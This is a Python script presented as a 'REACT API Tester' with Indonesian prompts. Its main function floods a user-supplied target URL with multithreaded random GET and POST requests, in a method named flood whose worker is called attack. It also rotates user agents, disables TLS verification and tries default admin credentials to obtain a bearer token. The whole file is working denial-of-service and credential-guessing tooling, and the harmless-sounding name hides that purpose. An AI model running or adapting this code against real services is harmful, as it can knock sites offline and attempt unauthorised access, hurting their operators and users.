import time
import json
import random
import requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class ReactAPITester:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        self.headers = {
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        }
        # Common React app endpoints
        self.endpoints = [
            "api/auth/login",
            "api/auth/register",
            "api/auth/logout",
            "api/users",
            "api/users/profile",
            "api/posts",
            "api/comments",
            "api/products",
            "api/orders",
            "api/cart",
            "api/search",
            "api/categories",
            "graphql",
            "api/settings",
            "api/notifications",
            "api/upload"
        ]
        self.payloads = {
            "login": {
                "email": "admin@example.com",
                "password": "admin123"
            },
            "register": {
                "username": "testuser",
                "email": "test@example.com",
                "password": "test123"
            },
            "post": {
                "title": "Test Post",
                "content": "This is a test post content",
                "userId": 1
            },
            "product": {
                "name": "Test Product",
                "price": 99.99,
                "description": "Test product description",
                "categoryId": 1
            },
            "graphql_query": {
                "query": """
                    query {
                        users {
                            id
                            name
                            email
                        }
                    }
                """
            }
        }

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def get_auth_token(self, url):
        login_url = f"{url.rstrip('/')}/api/auth/login"
        try:
            response = requests.post(
                login_url,
                json=self.payloads["login"],
                headers=self.headers,
                verify=False,
                timeout=5
            )
            if response.ok:
                return response.json().get("token")
        except:
            pass
        return None

    def send_request(self, method, url, endpoint, data=None):
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        self.headers["User-Agent"] = self.get_random_user_agent()

        try:
            if method.upper() == "GET":
                response = requests.get(
                    full_url,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
            else:
                response = requests.post(
                    full_url,
                    json=data,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
            
            print(f"[{response.status_code}] {method} {full_url}")
            return response.text if response.ok else None
        except RequestException as e:
            print(f"[ERROR] {method} {full_url}: {e}")
            return None

    def flood(self, url, workers=10, duration=60):
        print(f"[INFO] Starting API flood on {url} for {duration}s with {workers} threads")
        start_time = time.time()

        def attack():
            while time.time() - start_time < duration:
                endpoint = random.choice(self.endpoints)
                method = random.choice(["GET", "POST"])
                payload = None
                
                if method == "POST":
                    payload_type = random.choice(list(self.payloads.keys()))
                    payload = self.payloads[payload_type]
                    if endpoint == "api/auth/login":
                        token = self.get_auth_token(url)
                        if token:
                            self.headers["Authorization"] = f"Bearer {token}"
                
                self.send_request(method, url, endpoint, data=payload)
                time.sleep(random.uniform(0.1, 0.3))

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(attack) for _ in range(workers)]
            for future in futures:
                future.result()

def main():
    print("""
    ╔════════════════════════════════════════╗
    ║          REACT API Tester              ║
    ║            coded by Danz               ║
    ╚════════════════════════════════════════╝
    """)
    
    target_url = input("Masukan target React URL (e.g., https://react-app.example.com): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Invalid URL. Please include http:// or https://")
        return
    
    try:
        workers = int(input("Masukan number of threads (default: 20): ") or 20)
        duration = int(input("Masukan duration in seconds (default: 120): ") or 120)
        
        tester = ReactAPITester()
        tester.flood(target_url, workers=workers, duration=duration)
    except KeyboardInterrupt:
        print("\n[INFO] Attack interrupted by user.")
    except ValueError:
        print("[ERROR] Please enter valid numbers for threads and duration.")
    except Exception as e:
        print(f"[ERROR] Unexpected error occurred: {e}")

if __name__ == "__main__":
    main() 
